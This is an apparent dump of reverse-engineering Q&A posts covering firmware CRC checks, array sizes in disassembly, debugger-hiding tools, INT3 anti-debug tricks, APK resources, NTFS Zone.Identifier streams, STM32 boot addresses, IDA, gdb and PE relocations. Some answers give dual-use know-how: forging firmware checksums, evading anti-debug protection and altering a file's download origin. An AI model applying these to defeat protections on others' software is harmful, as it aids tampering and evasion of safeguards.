<li>Used web interface of device to upload new firmware</li>
</ol>

<p>It failed on step 7. I get a message saying something like ""this file does not contain valid data"". So, some sort of verification is performed by the device before installing updates.</p>

<p>So I kept investigating. The devolo image contains a devolo header/footer, a uboot and a uimage. The header/footer must contain some sort of checksum. I tried picking the valid (unadultered) update and changed one bit on the padding, uploaded it to the device and got the same error message.</p>

<p>If I knew where the cheksum is or how is obtained, I could change it after rebuilding the image. However I found no documentation about the devolo formats. To try to find the sum I compared the hexadecimal of two devolo images: wifi and wireless(the wireless image is on the same site from where I downloaded the wifi image; could not post this link and the fmk link because I have less than 10 reputation :( ). The headers/footers are very similar in most fields, though I found no 32byte field to be a sum. Perhaps someone more experienced on reverse engeneering could help me.</p>

<p>I could try to brute force the sum. Since it is a sum, I could create a colision by adding bits to the padding areas. For this I have two ideas:</p>

<ol>
<li>Send through the network every combination possible;</li>
<li>Use the downloaded image's libraries to test the sum locally;</li>
</ol>

<p>Option 1 would probably take a few years...</p>

<p>For option 2, I tried using a qemu virtual machine and compile there, and cross compiling, with no results, due to the devolo libs using an old libc version (<a href=""https://stackoverflow.com/questions/29153924/how-to-solve-c-conflicts-between-system-and-library-dependencies"">https://stackoverflow.com/questions/29153924/how-to-solve-c-conflicts-between-system-and-library-dependencies</a>).</p>

<p>My last idea is to somehow emulate the downloaded firmware in my amd64 machine, to compile some code there that would use the devolo libs, thus circumventing the dependency problems.</p>

<p>So, I would thank any tips/mistakes on my previous steps, and any pointers on how to run the downloaded image on my pc.</p>

<p>Thanks in advance (if for nothing, for reading my rather long post).</p>
","<p>Each section in the firmware file has a crc32 over its contents.</p>

<p>See <a href=""https://github.com/booto/develo_fw"" rel=""nofollow"">this</a>.</p>

<p>It should make option 1 more viable.</p>

<p>More details:
Inside the squashfs image there's whole heap of busybox based tools and a handful of standalone programs. There's one (<em>/usr/sbin/chunk</em>) that looked likely to have logic concerning the traversal of the firmware files. It contains a number of the 32bit values that matched the values in the firmware file that look like magic/fourcc values. strings(1) output was also pretty encouraging.</p>
","8534"
"How to find the size of an array in binary?","1065","","<p>I'm currently learning RE and try to understand some basic c programs.</p>

<p>I've almost figure out some concepts, but right now i've no idea how to find the size of an array when i use objdump or gdb.</p>

<p>for example :</p>

<pre><code>int main(int argc, char **argv)
{
  char buffer[64];               // &lt;= Where i supposed to find the array size ?
  gets(buffer);                   
  printf(""Buffer : %s"",buffer);
  return 0;
}
</code></pre>

<p>Anyone can explain me how is it possible ?</p>
","<p>There's no easy way to do this, C doesn't have a concept of array sizes (at execute time), so the size isn't stored anywhere. You'll have to read the assembly code and (try to) understand it.</p>

<p>Take the following program</p>

<pre><code>extern void *malloc(int);
extern char *strcpy(char *dst, char *src);

char firstname[80];
char lastname[80];

int main(void) {
    int some_variable=1;
    char buffer[64];
    int some_other_variable=2;
    char *otherbuffer=malloc(100);
    gets(buffer);
    strcpy(firstname, ""John"");
    strcpy(lastname, ""Doe"");
}
</code></pre>

<p>and compile it with <code>cc -fno-builtin -O0 -o arraysize arraysize.c</code>. (I had to disable built-in functions to prevent gcc from short-circuiting malloc and strcpy, and i declared them myself instead of using the headers for the same reason. Also, without -O0, gcc omits stuff that's never used).</p>

<p>Then, use <code>objdump -d arraysize</code> and check the <code>main</code> function:</p>

<pre><code>0000000000400554 &lt;main&gt;:
  400554:   55                      push   %rbp
  400555:   48 89 e5                mov    %rsp,%rbp

// This instruction tells you that the function needs 80 (0x50) bytes on the
// stack. This happens to be the same as the size of all local variables
// here, but might be higher as well if the function needs stack space for
// function arguments and the like.
  400558:   48 83 ec 50             sub    $0x50,%rsp


// This puts 1 and 2 into the integer variables. Note we now know they're
// located at -0x10(%rbp) and -0xc(%rbp) on the stack.
  40055c:   c7 45 f0 01 00 00 00    movl   $0x1,-0x10(%rbp)
  400563:   c7 45 f4 02 00 00 00    movl   $0x2,-0xc(%rbp)

// This calls malloc(100) and puts the result into -0x8(rbp). We now know
// the array pointed to has 100 bytes, because that's what was malloc'ed.
// Note that you have no other way of finding out the size afterwards
// (except if you know how exactly malloc is implemented and where malloc
// keeps its internal housekeeping structures)
  40056a:   bf 64 00 00 00          mov    $0x64,%edi
  40056f:   e8 b4 fe ff ff          callq  400428 &lt;malloc@plt&gt;
  400574:   48 89 45 f8             mov    %rax,-0x8(%rbp)

// now, we call gets, feeding it with -0x50(%rbp) as its parameter.
// As the next variable that's used on the stack is at -0x10(rbp), we can
// assume that the array has 0x40=64 bytes. This does not have to be true;
// for example, if the function declared 2 arrays of 32 bytes each, they'd
// be at -0x50(%rbp) and -0x30(%rbp), and if the function never used the
// one at 0x30(%rbp), there'd be no way for us to tell the difference.
  400578:   48 8d 45 b0             lea    -0x50(%rbp),%rax
  40057c:   48 89 c7                mov    %rax,%rdi
  40057f:   b8 00 00 00 00          mov    $0x0,%eax
  400584:   e8 bf fe ff ff          callq  400448 &lt;gets@plt&gt;

// This is the strcpy to firstname. The address of firstname is at 0x6009e0.
// We don't know how large it is, as we haven't seen a variable behind it yet.
  400589:   be a8 06 40 00          mov    $0x4006a8,%esi
  40058e:   bf e0 09 60 00          mov    $0x6009e0,%edi
  400593:   e8 c0 fe ff ff          callq  400458 &lt;strcpy@plt&gt;

// And this is the second strcpy, to lastname at 0x6000980. Since we've
// seen the other strcpy to 0x60009e0, we assume that there are no more than
// 0x50=80 bytes in that buffer, but see below.
  400598:   be ad 06 40 00          mov    $0x4006ad,%esi
  40059d:   bf 80 09 60 00          mov    $0x600980,%edi
  4005a2:   e8 b1 fe ff ff          callq  400458 &lt;strcpy@plt&gt;

// end of function
  4005a7:   c9                      leaveq 
  4005a8:   c3                      retq   
</code></pre>

<p>The C source code said</p>

<pre><code>char firstname[80];
char lastname[80];
strcpy(firstname, ""John"");
strcpy(lastname, ""Doe"");
</code></pre>

<p>and from the address difference between the two <code>strcpy</code>s, we assumed an array size of 80. But note that the exact same instructions would have been generated in that case:</p>

<pre><code>char name[160];
strcpy(name+80, ""John"");
strcpy(name, ""Doe"");
</code></pre>

<p>So if you don't have debugging symbols, all you get are assumptions.</p>
","6676"
"Getting past a whole lot of anti-debug measures for a windows exe","1064","","<p>I'm trying to debug a windows exe that is really full of anti-debug measures. It has pretty much everything you can think of DBGuiremotebreakin, Ntsetinformationthread, NtQueryInformationProcess, the works. The only problem is that I really need to get into it. The anti-debug stuff is mixed in all throughout the code with important computations that are used for the stuff I want to see. How could I start trying to spoof the measures so I can observe register usage unfoiled?</p>
","<p>You can use something like Scylla Hide</p>

<p><a href=""https://github.com/nihilus/ScyllaHide"" rel=""nofollow noreferrer"">https://github.com/nihilus/ScyllaHide</a></p>

<p>It has plugins for most popular debuggers. It has lots of hiding options and presets for advanced packers like Themida.</p>

<p>You can also try Titan Hide.</p>

<p><a href=""https://github.com/mrexodia/TitanHide"" rel=""nofollow noreferrer"">https://github.com/mrexodia/TitanHide</a></p>
","13590"
"R.java to xml file","1064","","<p>How does <code>R.java</code> work? In a compiled .apk file, does it contain all constants from the XML files prior to compilation? I've decompiled an app using several Java RE tools, and used <code>apktool</code> to extract the resources (xml files, images and others). However, when rebuilding the project in Eclipse, the <code>R.java</code> generated by Eclipse (in the <code>gen</code> folder) does not match the original <code>R.java</code> from the decompiled app. Is this a common occurrence when reversing android apps? In this case, the original R.java contains fields consistent with the rest of the code. However, this is not present in the generated R.java and hence this error.</p>

<p>The decompilers I used are</p>

<p>1) <a href=""http://www.android-decompiler.com"" rel=""nofollow noreferrer"">JEB</a> (Commercial)</p>

<p>2) <a href=""https://github.com/skylot/jadx"" rel=""nofollow noreferrer"">jadx</a> (Open-source)</p>

<p><img src=""https://i.stack.imgur.com/4BXHG.png"" alt=""enter image description here""></p>
","<p>The R.java file created by jadx exists to be a reference between the resources id after compilation and the name of the resource mentioned throughout the code. </p>

<p>If you wish to recompile it, it is possible to recreate something that looks like the original xml files by creating a script that ignores a part of the prefix and searches for the resource's name. Once it is located inside the xml files, specify the correct one.</p>

<p>And I think that apktool provides a much better reference to the resources xml files.</p>

<p>But if what you wanna do is make just a small change, it will be faster to do it with smali and use apktool to put it all back together again.</p>
","6588"
"OllyDbg2: What is the meaning of Stream in File View Window?","1062","","<p>What is the usage of ""Stream:"" portion in View==>File==>Open File window? For some files it shows <pre>main<br>:Zone.Identifier:$DATA</pre>
what's the meaning of this?</p>
","<p>An NTFS file can have <a href=""http://ntfs.com/ntfs-multiple.htm"" rel=""nofollow"">multiple data streams</a>. $DATA is the name of the default stream.</p>

<p>From <a href=""http://en.wikipedia.org/wiki/Fork_%28file_system%29"" rel=""nofollow"">Wikipedia</a>: Internet explorer, (and, according to the german wikipedia, newer versions of Firefox), use the Zone.Identifier stream to store information from where you downloaded the file. You might have seen the ""File Origin: downloaded from internet"" message in a UAC prompt. </p>

<p>You can edit the Zone.Identifier data with notepad. For example, on one of your files that have this attribute, run <code>notepad myfile.exe:Zone.Identifier</code>. This should give you something like</p>

<pre><code>[ZoneTransfer]
ZoneId=3
</code></pre>

<p>Change the 3 to a 0, then save from notepad. Next time you run the file as adminstrator, the ""Origin: Internet"" message will change to ""Origin: this computer's hard disk"".</p>

<p>The answer to your question ""why is it absent on some other files"" is - only NTFS supports this. If you copy a file to a USB stick, SD card, or network storage, the file will lose its stream; when you copy it back, it doesn't magically gain the stream back. So only files that you downloaded via internet explorer (and possibly other browsers) on your NTFS hard disk will have it. Or, of course, files in which you created the stream yourself, like in <code>echo ""this is a fake"" &gt; myfile.exe:Zone.Identifier</code>.</p>

<p>Of course, the only thing this has to do with reverse engineering is that Ollydbg is one of the few tools that tell you if a file as alternate data streams.</p>
","6098"
"Reverse Engineer STM32L151's Firmware","1062","","<p>I have the STM32L151's firmware that I extracted via JTAG, but I cannot find a start point in IDA. I have tried two methods:</p>

<p>1) I start IDA, drag the binary into the workspace, select ARM Little-endian for the processor type, click ok, the disassembly memory organization window appears, entered in relevant information found <a href=""http://www.st.com/content/ccc/resource/technical/document/datasheet/66/71/4b/23/94/c3/42/c8/CD00277537.pdf/files/CD00277537.pdf/jcr:content/translations/en.CD00277537.pdf"" rel=""nofollow"">here</a> on page 48, click ok, windows pops up saying ""IDA can not identify the entry point..."", in the workspace I see ""RAM:08000000        DCB [some hex number]""</p>

<p>2) Converted the binary to elf using my arm toolchain's objcopy, used ""readelf -h [my binary file]"" to find the entry point, got <a href=""http://pastebin.com/55NPVDhh"" rel=""nofollow"">this</a> output where the entry point is 0xff810000, dragged the elf into IDA's workspace, selected ARM Little-endian processor under processor type, clicked ok, and the workspace shows lines that look like "".data:0000002C        [several hex values separated by commas]""</p>

<p>If I try to jump to the entry point address (0xff810000 from readelf) I get an JumpAsk fail. How do I find my start point so I can start reading the disassembled ARM assembly code?</p>
","<p>From <a href=""http://www.st.com/content/ccc/resource/technical/document/datasheet/66/71/4b/23/94/c3/42/c8/CD00277537.pdf/files/CD00277537.pdf/jcr:content/translations/en.CD00277537.pdf"" rel=""nofollow noreferrer"">the PDF to which you linked</a>:</p>

<blockquote>
  <p><strong>3.3.4 Boot modes</strong></p>
  
  <p>At startup, boot pins are used to select one of three boot options:</p>
  
  <ul>
  <li>Boot from Flash memory</li>
  <li>Boot from System Memory</li>
  <li>Boot from embedded RAM</li>
  </ul>
  
  <p>The boot loader is located in System Memory. It
  is used to reprogram the Flash memory by using USART1 or USART2. See
  STM32™ microcontroller system memory boot mode AN2606 for details.</p>
</blockquote>

<p>If we <a href=""https://www.google.com/search?q=AN2606"" rel=""nofollow noreferrer"">Google for AN2606</a>, we find the documentation for the <a href=""http://www.st.com/content/ccc/resource/technical/document/application_note/b9/9b/16/3a/12/1e/40/0c/CD00167594.pdf/files/CD00167594.pdf/jcr:content/translations/en.CD00167594.pdf"" rel=""nofollow noreferrer"">STM32 microcontroller system memory boot mode</a>, which suggests in the table below that the bootloader begins at memory location <code>0x1FF00FFE</code>.</p>

<p>Additionally, the bootloader configuration table for each chip specifies the address of the bootloader firmware. For example, for STM32L01xxx/02xxx chips, page 174 specifies that the the bootloader's firmware is a 4 KB chunk that begins at address <code>0x1FF00000</code>.</p>

<p><a href=""https://i.stack.imgur.com/Envcu.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Envcu.png"" alt=""Embedded bootloaders""></a></p>
","13014"
"Detection of OllyDbg - INT3?","1058","","<p>I am trying to catch anti debugging routines, and I don't quite understand what INT3 does, and I have read that it can be used to detect debuggers and mask calls.  The program eventually sends me into a nonsensical loop if I am stepping, and if I am running, it will notify me that a debugger has been found.  </p>

<pre><code>77BE0000   8B4424 04        MOV EAX,DWORD PTR SS:[ESP+4]
77BE0004   CC               INT3
77BE0005   C2 0400          RETN 4
77BE0008 &gt; CC               INT3
77BE0009   90               NOP
77BE000A   C3               RETN
77BE000B   90               NOP
77BE000C &gt; CC               INT3
77BE000D   C3               RETN
</code></pre>

<p>I think INT3 might be something going on here.  Since my intel instruction set reference (<a href=""http://faydoc.tripod.com/cpu/index_i.htm"" rel=""nofollow"">http://faydoc.tripod.com/cpu/index_i.htm</a>) says this has something to do with a debugger interrupt.  I also read something about how these can be used to mask debugger detection from reverse engineers.</p>

<p>Am I barking up the wrong tree or is there something in this line of code questionable?</p>
","<p>This technique uses the fact that when the interrupt instructions INT3 (breakpoint) and INT1 
(single-step) are stepped thru inside a debugger, by default, the exception handler will not be 
invoked since debuggers typically handle the exceptions generated by these interrupts. Thus, 
a packer can set flags inside the exception handler, and if these flags are not set after the INT 
instruction, it means that the process is being debugged. Additionally, kernel32!DebugBreak() 
internally invokes an INT3 and some packers use the said API instead. </p>

<p><a href=""https://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf"" rel=""nofollow"">Reference</a></p>
","9531"
"IDA - cannot rename or jump to a global variable","1058","","<p>In an application I'm analyzing, there's a global variable whose purpose/role in the program is known to me. I'd like to rename it, but for some reason I cannot.</p>

<p>The assembly code:</p>

<pre><code>.text:00537E90                 mov     edx, ds:1C968D8h
.text:00537E96                 mov     [eax], edx
.text:00537E98                 mov     ds:1C968D8h, eax
</code></pre>

<p>If I position the cursor on the address (<code>ds:1C968D8h</code>) and try to jump (using Enter), IDA will complain <code>Command ""JumpEnter"" failed</code>. Attempting to rename it with the N hotkey will cause IDA to place a label at that address rather than rename the variable as intended.</p>

<p>While I'm doing this for educational purposes, this is a proprietary application, so I don't have the source code.</p>

<p>I've checked Chris Eagle's ""The IDA Pro Book"", but there seems to be nothing on the subject in there.</p>

<p>Help is greatly appreciated.</p>
","<p>One thing that I've failed to notice turned out to be crucial: this file wasn't generated by my copy of IDA, it was given to me by a friend as a helping resource. I've simply disassembled the very same exe with my IDA and the troublesome address is now correct:</p>

<p><img src=""https://i.stack.imgur.com/i2Y5o.png"" alt=""enter image description here""></p>

<p><img src=""https://i.stack.imgur.com/fK3Bo.png"" alt=""http://i.imgur.com/AzHGbT1.png""></p>
","6471"
"DLL entry point in memory","1057","","<p>I've been looking into the PE format using a random DLL as a test case. When I look manually at the entry point specified in the optional header (and add the image base, because RVA) it doesn't match the entry point address IDA gives in the exports list.</p>

<p>I know reading the entry point from the DLL isn't the problem, since if I calculate:</p>

<pre><code>(AddressOfEntryPoint - [.text section virtual]) + [.text section offset]
</code></pre>

<p>(which should give the file offset to the entry point) you can find at the offset the same bytes that IDA says should be in the entry function.</p>

<p>Also I know that IDA must be calculating the entry point from this field since <code>DLLEntryPoint</code> isn't in the exports list.</p>

<p>Am I missing something? If I do the same analysis on a normal executable everything works.</p>
","<p>When you open a DLL file with IDA, if IDA is able to find the <code>DllMain()</code> function then it will automatically navigate to that function when you first disassemble the DLL. Note that the DLL's entry point (which IDA names ""<code>DllEntryPoint</code>"") does not always (and in fact often does not) point to the <code>DllMain()</code> function.</p>

<p>You can see in the image below (full-size at <a href=""https://i.imgur.com/fuaKqdk.png"" rel=""nofollow noreferrer"">http://i.imgur.com/fuaKqdk.png</a>) that the DLL's entry point is <code>10807A1C</code>. I've pointed from the entry point's artificial entry in the Exports table (since IDA gets the address from the PE's Entry Point field, not the actual PE Export Table) to the disassembly for the entry point code via arrow #1.</p>

<p>The code at the entry point (named <code>DllEntryPoint()</code> by IDA) calls <code>___DllMainCRTStartup()</code> via arrow #2. Then <code>__DllMainCRTStartup()</code> calls <code>DllMain()</code> via arrow #3.</p>

<p>The two function executed before <code>DllMain()</code> are from VC++ 6's runtime library.</p>

<p><img src=""https://i.stack.imgur.com/CzKQj.png"" alt=""IDA""></p>
","8996"
"IDA: Segment Class Name","1057","","<p>As per <a href=""https://www.hex-rays.com/products/ida/support/idadoc/517.shtml"" rel=""nofollow"">IDA Online Help</a>:</p>

<blockquote>
  <p>The segment class name identifies the segment with a class name (such as CODE, FAR_DATA, or STACK). The linker places segments with the same class name into a contiguous area of memory in the runtime memory map.</p>
</blockquote>

<p>IDA has the following predefined segment class names:</p>

<pre><code>    CODE    -       Pure code
    DATA    -       Pure data
    CONST   -       Pure data
    BSS     -       Uninitialized data
    STACK   -       Uninitialized data
    XTRN    -       Extern definitions segment
</code></pre>

<p>As far as I could tell permission on a segment already offer all relevant information.
What is the exact purpose(or applicable usage) of <em>Segment Class Name</em>? How does IDA utilize it internally?</p>
","<p>I have looked through <a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""nofollow"">IDA SDK</a> and specifically <em>segment.hpp</em> file, and this is what I figured out. IDA has 12 segments types defined based on how those are treated by kernel. In addition, there are several ""fake"" segments, which IDA presumes would not contain code or data. As a result those are completely excluded from disassembly. This is how segment type is defined:</p>

<pre><code>/* 94 */  uchar type;   // Type of the segment. The kernel treats different
                        // segment types differently.
                        // Segments marked with '*' contain no instructions
                        // or data and are not declared as 'segments' in
                        // the disassembly.

#define SEG_NORM        0       // Unknown type, no assumptions
#define SEG_XTRN        1       // * segment with 'extern' definitions
                                //   no instructions are allowed
#define SEG_CODE        2       // code segment
#define SEG_DATA        3       // data segment
#define SEG_IMP         4       // java: implementation segment
#define SEG_GRP         6       // * group of segments
#define SEG_NULL        7       // zero-length segment
#define SEG_UNDF        8       // undefined segment type (not used)
#define SEG_BSS         9       // uninitialized segment
#define SEG_ABSSYM     10       // * segment with definitions of absolute symbols
#define SEG_COMM       11       // * segment with communal definitions
#define SEG_IMEM       12       // internal processor memory &amp; sfr (8051)
</code></pre>

<p>The Class of the segment is ""mapped"" to its type in the following manner:</p>

<pre><code> //                      ""CODE""  -&gt; SEG_CODE
 //                      ""DATA""  -&gt; SEG_DATA
 //                      ""CONST"" -&gt; SEG_DATA
 //                      ""STACK"" -&gt; SEG_BSS
 //                      ""BSS""   -&gt; SEG_BSS
 //                      ""XTRN""  -&gt; SEG_XTRN
 //                      ""COMM""  -&gt; SEG_COMM
 //                      ""ABS""   -&gt; SEG_ABS
</code></pre>

<p>In addition, I have found out that permissions are actually ""figured out"" and set by particular loader modules, which would also set segment types (ergo Classes) based on specifics of the loaded file. </p>
","2445"
"Debug httpd process","1053","","<p>I'm attempting to inspect memory of an httpd binary compiled statically with openssl. When I list the httpd processes, I get:</p>

<pre><code>$ ps aux|grep httpd
root     58539  0.0  0.7  75364  3740 ?        Ss   14:49   0:00 /opt/httpd/bin/httpd
daemon   58850  0.0  0.5 364328  2556 ?        Sl   14:58   0:00 /opt/httpd/bin/httpd
daemon   58914  0.0  0.5 364328  2548 ?        Sl   14:59   0:00 /opt/httpd/bin/httpd
daemon   58942  0.0  0.5 364328  2544 ?        Sl   14:59   0:00 /opt/httpd/bin/httpd
</code></pre>

<p>I then tried attaching to each of the processes individually and applying a breakpoint to the function I am trying to debug. However, the breakpoint never gets triggered, although I know the function is being called.  I assume this problem relates to something along the lines of httpd forking on a new process, but I'm a bit stuck on how to proceed. Is there a generic way to ensure my breakpoint is triggered even if the processes forks?</p>
","<p>Depending on the worker model your apache is configured to use its likely a new worker is being spawned to handle your request if your bp isnt hitting. Like Guntram said you can <a href=""https://httpd.apache.org/dev/debugging.html"" rel=""nofollow"">disable forking</a> and put httpd in debug mode by using the <code>-X</code> flag and starting gdb with:</p>

<pre><code>gdb httpd -X
</code></pre>

<p>If for some reason you need to debug the multiple worker configured httpd you should use the gdb options <code>set follow-fork-mode ask</code> or <code>set follow-fork-mode child</code> if you know you'd like to follow all forks in advance. (<a href=""https://sourceware.org/gdb/onlinedocs/gdb/Forks.html"" rel=""nofollow"">https://sourceware.org/gdb/onlinedocs/gdb/Forks.html</a>). This would also be considered the 'generic approach' and would apply to programs that don't allow you to run single process in the foreground.</p>
","6407"
"copy/pasting sections of code or hex in Ollydbg","1052","","<p>Is it possible to somehow copy/paste sections of data in the hex dump, or lines of code in the code (top left in CPU window disassembly window)?</p>

<p>Example: cloning a function, and then making some changes.  Another example, copying a section of code that puts arguments on the stack and then calls a function like opening a messagebox, i.e. copying some 4-5 lines.  </p>

<p>I can double click in the code (disassembly) window in the ""command"" column to open the ""assemble"" dialog, copy the text (such as CALL 004026F8), then close it (without changing this instruction) then go to some NOP's or 0's or something, double clicking (""command"" column again) to open the assembly dialog again and pasting it in.  This is ok for one or two instructions, but it would be nice if I could just select several lines and copy/paste them at once.  Or if I could do it in the hex dump window by copying just bytes instead of lines of code.  </p>

<p>I see the ""binary copy"" and ""binary paste"" in the hex dump window but they only do it for one byte, not a selected region.</p>

<p>I see in some videos people noting down addresses and running a separate hex editor program just to do this type of operation.  </p>

<p>By the way, by selecting a region of data in the hex dump, one can right-click ""Open in separate dump window"" to open a window containing just this, and then write this selected data out to a file <a href=""https://stackoverflow.com/questions/34341726/how-to-dump-memory-into-raw-file-in-ollydbg/3437098"">link</a>.  And one can bring in .bin files (not by File-Open but by drag and dropping them in) to a window also.  But I can't see how to copy more than one byte at a time between them.</p>

<p>I'm almost embarrassed to ask this question, but I like Olly and want to be a ""power-user"".</p>
","<p><code>select -&gt; ctrl+c</code> copy the whole display as text usefull for taking notes 
option available in all mdi windows </p>

<pre><code>CPU Disasm
Address          Hex dump   Command                                     Comments
01261970 _allmul /$  8B4424 MOV     EAX, DWORD PTR SS:[ESP+8]      ; multiargs._allmul(void)
01261974         |.  8B4C24 MOV     ECX, DWORD PTR SS:[ESP+10]
01261978         |.  0BC8   OR      ECX, EAX
0126197A         |.  8B4C24 MOV     ECX, DWORD PTR SS:[ESP+0C]
</code></pre>

<p>binary copy copies only the bytes </p>

<pre><code>8B 44 24 08 8B 4C 24 10 0B C8 8B 4C 24 0C
</code></pre>

<p>binary paste pastes multiple bytes    </p>

<p>for pasting several copied bytes your paste area selection must be 
as big as copy  if you copied 5 bytes and want to paste 5 bytes select 5 bytes before pasting </p>

<p>to make the address column symbols highlighted use 
<code>options (alt + o ) dump -&gt; highlight symbolic names</code> in address column</p>
","11896"
"IDA Proximity viewer not finding obvious paths?","1052","","<p>Using IDA 6.2 (and also with IDA 6.4), I'm trying out the Proximity viewer to find the path between 2 functions as described at the <a href=""http://www.hexblog.com/?p=468"" rel=""nofollow noreferrer"">hexblog post here</a>.</p>

<p>Using the <code>Xrefs From/To</code> (old option) it shows the clear path: <code>AllocateVolume</code> -> <code>VolumeSortCmp</code> -> <code>CompareVolumeComponents</code> as shown in the screenshot below</p>

<p><a href=""https://imgur.com/RPmxNJO"" rel=""nofollow noreferrer""><img src=""https://i.imgur.com/RPmxNJO.png?1"" alt="""" title=""Hosted by imgur.com"" /></a></p>

<p>Apart from the <code>add name</code> and <code>hide childs</code> options not existing in the context menu (as described in the blog) of the proximity browser as seen in the screenshot below
<a href=""https://imgur.com/jJDeAdU"" rel=""nofollow noreferrer""><img src=""https://i.imgur.com/jJDeAdU.png"" alt="""" title=""Hosted by imgur.com"" /></a>
the <code>find path</code> menu does list <code>CompareVolumeComponents</code> in the dialog that opens (so it has some knowledge of what is reachable). 
<a href=""https://imgur.com/dD1LGqZ"" rel=""nofollow noreferrer""></a></p>

<p>However when I press search I expected a nice clean graph (as again shown in the blog and added as reference below) showing only the the 3 relevant nodes, but instead nothing seems to change to the proximity browser layout as I still see 30 something nodes. </p>

<p><strong>Hexblog condensed <code>Find path</code> example result</strong>
<img src=""https://i.stack.imgur.com/2CeHx.png"" alt=""hexblog condensed example result""></p>

<p><strong>My result</strong>
<img src=""https://i.stack.imgur.com/WZO0I.png"" alt=""enter image description here""></p>

<p>Is the proximity viewer malfunctioning or are my expectations off? Or am i doing something wrong here?</p>
","<p>I think that the problem is a misunderstanding of how the Proximity Viewer works. It will not clear out all the other nodes in the graph when finding a path: it simply finds a path and adds the required nodes to the graph. If you want to view only the nodes between AllocateVolume and CompareVolumeComponents, do the following:</p>

<ol>
<li>Navigate to AllocateVolume and press '-'.</li>
<li>Right click on the center node AllocateVolume and select ""Collapse  children"", then, ""Collapse parents"" as well.</li>
<li>Then, right click outside this node in the proximity view and select ""Add name"".</li>
<li>Find ""CompareVolumeComponents"" and add it.</li>
<li>After this step, right click on the AllocateVolume node, select ""Find Path"" and select the only other available node.</li>
</ol>

<p>If everything goes OK, you will have a graph with only the functions required to display a path from AllocateVolume to CompareVolumeComponents. If it does not, there may be some problem with the current code of the Proximity Viewer (in that case, please contact support at Hex-Rays for a fix). Also, you may want to take a look to the ""callgraph"" plugin in the SDK: the algorithm to find paths is pretty much the same and you may get an idea about why it isn't working.</p>

<p>As a side note, a little explanation of how the PV works: The algorithm does not consider a path only calls/jmps as (Q)WinGraph32 does (IIRC) but also consider a path when there are data references. If a function A references, in any way, function B, then the proximity viewer will show that reference (with a gray edge instead of a blue edge). BTW, I'm the guy who wrote it.</p>
","1590"
"Using GDB to look at stack","1052","","<p>I'm not experienced with GDB, and trying to examine an executable. I want to find the value of <code>%eax</code> at certain times, and whether it's ever <code>called</code> or <code>jumped</code>.</p>

<p>I was only given the executable, and it doesn't have any breakpoints.</p>

<p>If I enter <code>run</code>, the program runs and then finishes, and no commands work—I get ""No symbol table is loaded"" and ""No registers.""</p>

<p>Dissembling the executable (<code>objdump -d</code>) doesn't help, the result is 130,000 lines long.</p>

<p>How can I do this analysis?</p>

<p>Update: I used PEDA successfully; I set breakpoints at the functions and stepped through the program using <code>next</code>.</p>
","<p>First, you really need to set a breakpoint somewhere if you want <code>gdb</code> to stop before the program end.</p>

<p>Then, you should really try to use <code>peda</code>, a set of configuration and Python scripts for <code>gdb</code> designed for reverse-engineering software.</p>

<p>Take a look at:</p>

<ul>
<li><a href=""http://ropshell.com/peda/"" rel=""nofollow noreferrer"">The official page</a></li>
<li><a href=""https://github.com/longld/peda"" rel=""nofollow noreferrer"">The Github page</a></li>
<li><a href=""http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf"" rel=""nofollow noreferrer"">Slides from BlackHat'12</a></li>
</ul>

<p><img src=""https://i.stack.imgur.com/r1dzi.png"" alt=""enter image description here""></p>
","6573"
"Tracking What Is Done With a Function's Return Value","1051","","<p>I wrote a simple IDA plugin that, after a function call, looks for <code>mov MEM_LOCATION eax</code> and adds a name for the memory where the return value is stored. I limit my search to only a few instructions after the function call and bail out if I see another call before the return value is stored. Is there a more rigorous way to track where the return value goes besides these heuristics?</p>
","<p>In the static context, this is known as ""data flow analysis"".  For example, Hex-Rays incorporates the return-location information for function calls into its representation of the function so as to determine into which other locations that data flows.  You don't give a lot of detail on what you want to do with this information, but off the top of my head I'd say it could be worthwhile to investigate writing a Hex-Rays plugin.</p>
","2245"
"How .reloc Section is used in PE file?","1049","","<p>I have read document <code>pecoff_v83</code> of Microsoft. In The <code>.reloc</code> section part, I have read: </p>

<blockquote>
  <p>The Fix-Up Table contains entries for all fixups in the image. The Total Fix-Up Data Size in the Optional Header is the number of bytes in the fixup table. The fixup table is broken into blocks of fixups. Each block represents the fixups for a 4K page. Each block must start on a 32-bit boundary.</p>
</blockquote>

<p>And, I knew that each block contain: Page RVA and Block Size. Each Block size contain: Type and offset.</p>

<p>I used <code>peview</code>:</p>

<p><a href=""https://i.stack.imgur.com/BwGeF.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/BwGeF.png"" alt=""peview display""></a></p>

<p>I have a few questions:</p>

<ol>
<li><p>""<em>Each block must start on a 32-bit boundary</em>"" - I don't understand that, can you explain it?</p></li>
<li><p>Do PE files use <code>IMAGE_BASE_RELOCATION</code> to work?</p></li>
<li><p>From this <a href=""https://stackoverflow.com/questions/6002359/so-most-of-the-binary-is-composed-of-reloc-table"">SO question ('<em>So most of the binary is composed of reloc table?</em>')</a> :</p>

<blockquote>
  <p>If your program makes a frequent access to global variables and constants, it will have a huge relocation table because theres so much places that the loader has to update</p>
</blockquote>

<p>How does the loader use relocation table and update it?</p></li>
</ol>
","<blockquote>
  <p>""Each block must start on a 32-bit boundary"" - I don't understand that, can you explain it?</p>
</blockquote>

<p>It means even if you have space after your block finished, you must use next 32-bit aligned address for your RVA. In my opinion it is mostly because page optimization. You can read <a href=""https://www.ibm.com/developerworks/library/pa-dalign/"" rel=""nofollow noreferrer"">this</a> document for further understanding.</p>

<blockquote>
  <p>Do PE files use IMAGE_BASE_RELOCATION to work?</p>
</blockquote>

<p>IMAGE_BASE_RELOCATION is a data structure which can be expressed as:</p>

<pre><code>typedef struct _IMAGE_BASE_RELOCATION {
    DWORD   VirtualAddress;
    DWORD   SizeOfBlock;
} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;
</code></pre>

<p>PE files don't use IMAGE_BASE_RELOCATION structure to work, PE loader (dynamic linker) use it for constructing relocation table. You can read <a href=""https://stackoverflow.com/questions/17436668/how-are-pe-base-relocations-build-up"">this</a> topic if you want to learn more about relocation table.</p>

<blockquote>
  <p>In <a href=""https://stackoverflow.com/questions/6002359/so-most-of-the-binary-is-composed-of-reloc-table"">https://stackoverflow.com/questions/6002359/so-most-of-the-binary-is-composed-of-reloc-table</a></p>
  
